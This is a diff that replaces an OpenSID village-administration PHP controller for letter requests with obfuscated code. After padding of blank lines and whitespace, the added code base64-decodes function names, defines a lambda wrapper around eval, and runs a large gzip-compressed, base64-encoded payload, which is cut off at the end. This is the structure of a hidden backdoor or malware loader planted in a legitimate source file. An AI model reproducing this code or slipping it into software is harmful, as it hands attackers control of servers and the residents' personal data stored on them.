@@ -1,311 +1,593 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Permohonan_surat_admin.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Libraries\TinyMCE;
-use App\Models\Dokumen;
-use App\Models\DokumenHidup;
-use App\Models\FormatSurat;
-use App\Models\LogSurat;
-use App\Models\Penduduk;
-use App\Models\PermohonanSurat;
-use App\Models\PesanMandiri;
-use Illuminate\Support\Facades\View;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Permohonan_surat_admin extends Admin_Controller
-{
-    public $modul_ini     = 'layanan-surat';
-    public $sub_modul_ini = 'permohonan-surat';
 
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-    }
 
-    public function index()
-    {
-        return view('admin.permohonan_surat.index', [
-            'list_status_permohonan' => PermohonanSurat::STATUS_PERMOHONAN,
-        ]);
-    }
 
-    public function datatables()
-    {
-        if ($this->input->is_ajax_request()) {
-            return datatables(PermohonanSurat::select('permohonan_surat.*')->with(['penduduk:id,nik,nama', 'surat:id,nama'])->status((string) $this->input->get('status')))
-                ->addIndexColumn()
-                ->addColumn('aksi', static function ($row): string {
-                    $aksi = '';
 
-                    if (can('u')) {
-                        if ($row->status == PermohonanSurat::BELUM_LENGKAP) {
-                            $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                'url'     => '',
-                                'judul'   => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::BELUM_LENGKAP],
-                                'icon'    => 'fa fa-info-circle',
-                                'type'    => 'bg-navy btn-proses',
-                                'tooltip' => 'Surat Belum Lengkap',
-                            ])->render();
-                        } elseif ($row->status == PermohonanSurat::SEDANG_DIPERIKSA) {
-                            $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                'url'      => 'permohonan_surat_admin/periksa/' . $row->id,
-                                'judul'    => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::SEDANG_DIPERIKSA],
-                                'icon'     => 'fa fa-spinner',
-                                'type'     => 'btn-info',
-                                'attribut' => 'style="width:170px"',
-                                'tooltip'  => 'Klik untuk memeriksa',
-                            ])->render();
-                        } elseif ($row->status == PermohonanSurat::MENUNGGU_TANDA_TANGAN) {
-                            if (in_array($row->surat->jenis, FormatSurat::TINYMCE) && (setting('verifikasi_sekdes') || setting('verifikasi_kades'))) {
-                                $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                    'url'     => '',
-                                    'judul'   => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::MENUNGGU_TANDA_TANGAN],
-                                    'icon'    => 'fa fa-edit',
-                                    'type'    => 'bg-purple btn-proses',
-                                    'tooltip' => 'Surat Menunggu Tandatangan',
-                                ])->render();
-                            } else {
-                                $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                    'url'      => 'permohonan_surat_admin/proses/' . $row->id . '/3',
-                                    'judul'    => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::MENUNGGU_TANDA_TANGAN],
-                                    'icon'     => 'fa fa-edit',
-                                    'type'     => 'bg-purple',
-                                    'attribut' => 'style="width:170px"',
-                                    'tooltip'  => 'Surat Menunggu Tandatangan',
-                                ])->render();
-                            }
-                        } elseif ($row->status == PermohonanSurat::SIAP_DIAMBIL) {
-                            $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                'url'      => 'permohonan_surat_admin/proses/' . $row->id . '/4',
-                                'judul'    => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::SIAP_DIAMBIL],
-                                'icon'     => 'fa fa-thumbs-o-up',
-                                'type'     => 'bg-orange',
-                                'attribut' => 'style="width:170px"',
-                                'tooltip'  => 'Klik jika telah diambil',
-                            ])->render();
-                        } elseif ($row->status == PermohonanSurat::SUDAH_DIAMBIL) {
-                            $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                'url'      => '',
-                                'judul'    => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::SUDAH_DIAMBIL],
-                                'icon'     => 'fa fa-check',
-                                'type'     => 'btn-success btn-proses',
-                                'attribut' => 'style="width:170px"',
-                                'tooltip'  => 'Surat Sudah Diambil',
-                            ])->render();
-                        } else {
-                            $aksi .= View::make('admin.layouts.components.buttons.btn', [
-                                'url'      => '',
-                                'judul'    => PermohonanSurat::STATUS_PERMOHONAN[PermohonanSurat::DIBATALKAN],
-                                'icon'     => 'fa fa-times',
-                                'type'     => 'btn-danger btn-proses',
-                                'attribut' => 'style="width:170px"',
-                                'tooltip'  => 'Surat Dibatalkan',
-                            ])->render();
 
-                            if (can('h') && ci_auth()->id == super_admin()) {
-                                $aksi .= View::make('admin.layouts.components.buttons.hapus', [
-                                    'url'           => ci_route('permohonan_surat_admin.delete', $row->id),
-                                    'confirmDelete' => true,
-                                ])->render();
-                            }
-                        }
-                    }
 
-                    return $aksi;
-                })
-                ->editColumn('no_antrian', static fn ($row) => get_antrian($row->no_antrian))
-                ->editColumn('created_at', static fn ($row) => tgl_indo2($row->created_at))
-                ->rawColumns(['aksi'])
-                ->make();
-        }
 
-        return show_404();
-    }
 
-    public function periksa($id = ''): void
-    {
-        // Cek hanya status = 1 (sedang diperiksa) yg boleh di proses
-        $periksa = PermohonanSurat::whereStatus(PermohonanSurat::SEDANG_DIPERIKSA)->find($id);
 
-        if (! $id || ! $periksa) {
-            show_404();
-        }
-        $url = $periksa->surat->url_surat;
 
-        $penduduk = Penduduk::find($periksa->id_pemohon);
 
-        $data['periksa']  = $periksa;
-        $data['surat']    = $periksa->surat;
-        $data['url']      = $url;
-        $data['individu'] = $penduduk->toArray();
-        $this->get_data_untuk_form($url, $data);
-        $data['isian_form']        = json_encode($this->ambil_isi_form($periksa->isian_form), JSON_THROW_ON_ERROR);
-        $data['surat_url']         = rtrim((string) $_SERVER['REQUEST_URI'], '/clear');
-        $data['syarat_permohonan'] = $periksa->mapSyaratSurat();
-        $data['list_dokumen']      = empty($_POST['nik']) ? null : DokumenHidup::whereIdPend($periksa->id_pemohon)->get()->toArray();
-        $data['form_action']       = ci_route("surat.pratinjau.{$url}.{$id}");
 
-        $pesan   = 'Permohonan Surat - ' . $periksa->surat->nama . ' - sedang dalam proses oleh operator';
-        $judul   = 'Permohonan Surat - ' . $periksa->surat->nama . ' - sedang dalam proses';
-        $payload = '/layanan';
-        // kirim notifikasi fcm
-        $this->kirim_notifikasi_penduduk($periksa->id_pemohon, $pesan, $judul, $payload);
 
-        $data['surat']['kode_isian'] = collect($data['surat']->kode_isian)->groupByLabel();
 
-        view('admin.permohonan_surat.periksa_surat', $data);
-    }
 
-    public function proses($id = '', $status = 0): void
-    {
-        $permohonan = PermohonanSurat::find($id);
-        $permohonan->update(['status' => $status]);
 
-        redirect_with('success', 'Berhasil Ubah Data');
-    }
 
-    public function konfirmasi($id_permohonan = 0, $tipe = 0): void
-    {
-        $data['form_action'] = route('permohonan_surat_admin.kirim_pesan', ['id_permohonan' => $id_permohonan, 'tipe' => $tipe]);
 
-        view('admin.permohonan_surat.konfirmasi_permohonan', $data);
-    }
 
-    public function kirim_pesan($id_permohonan = 0, $tipe = 0): void
-    {
-        $tipe ??= 0;
-        $periksa = PermohonanSurat::with(['surat'])->where(['id' => $id_permohonan, 'status' => PermohonanSurat::SEDANG_DIPERIKSA])->first()->toArray();
-        $pemohon = Penduduk::find($periksa['id_pemohon'])->toArray();
-        $post    = $this->input->post();
-        $judul   = ($tipe == 0) ? 'Perlu Dilengkapi' : 'Dibatalkan';
-        $data    = [
-            'owner'       => $pemohon['nama'], // TODO : Gunakan id_pend
-            'penduduk_id' => $periksa['id_pemohon'],
-            'subjek'      => 'Permohonan Surat ' . $periksa['surat']['nama'] . ' ' . $judul,
-            'komentar'    => $post['pesan'],
-            'status'      => 2,
-            'tipe'        => 2,
-        ];
 
-        PesanMandiri::create($data);
-        $this->proses($id_permohonan, $tipe);
 
-        $this->kirim_notifikasi_penduduk($id_permohonan, $data['komentar'], $data['subjek'], '/layanan');
 
-        redirect('permohonan_surat_admin');
-    }
 
-    public function delete($id = ''): void
-    {
-        isCan('h');
 
-        $delete = PermohonanSurat::where('status', PermohonanSurat::DIBATALKAN)->find($id) ?? show_404();
 
-        if ($delete->delete()) {
-            redirect_with('success', 'Berhasil Hapus Data');
-        }
 
-        redirect_with('error', 'Gagal Hapus Data');
-    }
 
-    public function tampilkan($id_dokumen, $id_pend = 0): void
-    {
-        $berkasObj = Dokumen::aktif()->whereId($id_dokumen)->first();
-        $berkas    = $berkasObj ? $berkasObj->satuan : null;
 
-        if (! $id_dokumen || ! $id_pend || ! $berkas || ! file_exists(LOKASI_DOKUMEN . $berkas)) {
-            $data['link_berkas'] = null;
-        } else {
-            $data = [
-                'link_berkas' => site_url("{$this->controller}/tampilkan_berkas/{$id_dokumen}/{$id_pend}"),
-                'tipe'        => get_extension($berkas),
-                'link_unduh'  => site_url("{$this->controller}/unduh_berkas/{$id_dokumen}/{$id_pend}"),
-            ];
-        }
-        view('admin.layouts.components.tampilkan', $data);
-    }
 
-    /**
-     * Unduh berkas berdasarkan kolom dokumen.id
-     *
-     * @param int        $id_dokumen Id berkas pada koloam dokumen.id
-     * @param mixed|null $id_pend
-     */
-    public function unduh_berkas($id_dokumen, $id_pend = null, mixed $tampil = false): void
-    {
-        // Ambil nama berkas dari database
-        $data = Dokumen::find($id_dokumen);
-        ambilBerkas($data->satuan ?? '', $this->controller, null, LOKASI_DOKUMEN, $tampil);
-    }
 
-    public function tampilkan_berkas($id_dokumen, $id_pend = null): void
-    {
-        $this->unduh_berkas($id_dokumen, $id_pend, $tampil = true);
-    }
 
-    private function get_data_untuk_form($url, array &$data): void
-    {
-        // Panggil 1 penduduk berdasarkan datanya sendiri
-        $data['penduduk'] = [$data['periksa']['penduduk']];
 
-        $data['surat_terakhir']     = LogSurat::lastNomerSurat($url);
-        $data['input']              = $this->input->post();
-        $data['input']['nomor']     = $data['surat_terakhir']['no_surat_berikutnya'];
-        $data['format_nomor_surat'] = FormatSurat::format_penomoran_surat($data);
 
-        $tinymce           = new TinyMCE();
-        $penandatangan     = $tinymce->formPenandatangan();
-        $data['pamong']    = $penandatangan['penandatangan'];
-        $data['atas_nama'] = $penandatangan['atas_nama'];
-    }
 
-    /**
-     * @return mixed[]
-     */
-    private function ambil_isi_form(array $isian_form): array
-    {
-        $hapus = ['url_surat', 'url_remote', 'nik', 'id_surat', 'nomor', 'pilih_atas_nama', 'pamong', 'pamong_nip', 'jabatan', 'pamong_id'];
 
-        foreach ($hapus as $kolom) {
-            unset($isian_form[$kolom]);
-        }
 
-        return $isian_form;
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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